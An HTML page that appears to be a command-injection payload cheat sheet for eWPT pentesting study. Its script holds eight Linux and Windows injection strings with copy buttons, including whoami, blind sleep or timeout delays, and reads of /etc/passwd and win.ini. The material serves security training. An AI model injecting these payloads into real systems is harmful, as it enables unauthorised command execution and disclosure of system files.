<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Command Injection - eWPT</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background-color: #1c1c1c; color: #dcdcdc; margin: 20px; }
        .header-container { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #a0a0a0; padding-bottom: 10px; }
        h2 { color: #ffffff; margin: 0; }
        table { width: 100%; border-collapse: collapse; background-color: #2b2b2b; margin-top: 20px; table-layout: fixed; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #444; word-wrap: break-word; }
        th { background-color: #383838; color: #a0a0a0; }
        .payload-code { font-family: 'Courier New', monospace; color: #00ff00; background: #121212; padding: 4px 8px; border-radius: 4px; display: block; }
        button { background-color: #a0a0a0; color: #000; border: none; padding: 8px 15px; cursor: pointer; border-radius: 4px; font-weight: bold; }
        .reset-btn { background-color: #ff5555; color: white; }
        input[type="text"] { width: 95%; background: #1c1c1c; border: 1px solid #555; color: #fff; padding: 6px; }
    </style>
</head>
<body>
    <div class="header-container">
        <h2>💻 Command Injection</h2>
        <button class="reset-btn" onclick="resetForm()">Clear All</button>
    </div>
    <p>Live tool for eWPT. Payloads are Base64 encoded in the source.</p>
    <table>
        <thead>
            <tr>
                <th style="width: 30px;">#</th>
                <th style="width: 35%;">Payload</th>
                <th style="width: 25%;">Description</th>
                <th style="width: 100px;">Action</th>
                <th>Notes</th>
            </tr>
        </thead>
        <tbody id="tableBody"></tbody>
    </table>
    <script>
        const payloads = [
            { id: 1, p: '; id', d: 'Linux: Basic Execution' },
            { id: 2, p: '&& whoami', d: 'Linux/Win: Logical AND' },
            { id: 3, p: '| dir', d: 'Windows: Pipe Execution' },
            { id: 4, p: '`sleep 10`', d: 'Linux: Backtick Blind' },
            { id: 5, p: '$(sleep 10)', d: 'Linux: Subshell Blind' },
            { id: 6, p: '& timeout /t 10', d: 'Windows: Blind Delay' },
            { id: 7, p: '; cat /etc/passwd', d: 'Linux: File Read' },
            { id: 8, p: '| type C:\\windows\\win.ini', d: 'Windows: File Read' }
        ];
        const tableBody = document.getElementById('tableBody');
        payloads.forEach(item => {
            const b64 = btoa(item.p);
            tableBody.innerHTML += `<tr><td>${item.id}</td><td><span class="payload-code">${item.p}</span></td><td>${item.d}</td><td><button onclick="copyEncoded('${b64}')">Copy</button></td><td><input type="text"></td></tr>`;
        });
        function copyEncoded(b64) { navigator.clipboard.writeText(atob(b64)); event.target.innerText = 'Copied!'; setTimeout(() => { event.target.innerText = 'Copy'; }, 800); }
        function resetForm() { location.reload(); }
    </script>
</body>
</html>
